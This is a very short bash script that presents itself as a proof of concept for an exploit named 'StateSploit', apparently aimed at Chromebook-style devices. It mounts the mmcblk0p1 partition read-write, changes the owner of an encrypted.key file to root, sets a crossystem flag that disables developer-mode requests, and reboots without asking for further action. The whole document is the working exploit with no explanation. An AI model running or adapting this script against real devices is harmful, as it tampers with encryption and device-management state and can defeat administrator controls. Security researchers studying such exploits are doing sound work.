#!/bin/bash
#------PoC of StateSploit by writable----
mkdir -p /mnt/sp1
mount -o loop,rw /dev/mmcblk0p1 /mnt/sp1
chown root /mnt/sp1/encrypted.key
crossystem disable_dev_request=1
echo "Rebooting in 3 seconds, you do not need to take any further actions!"
reboot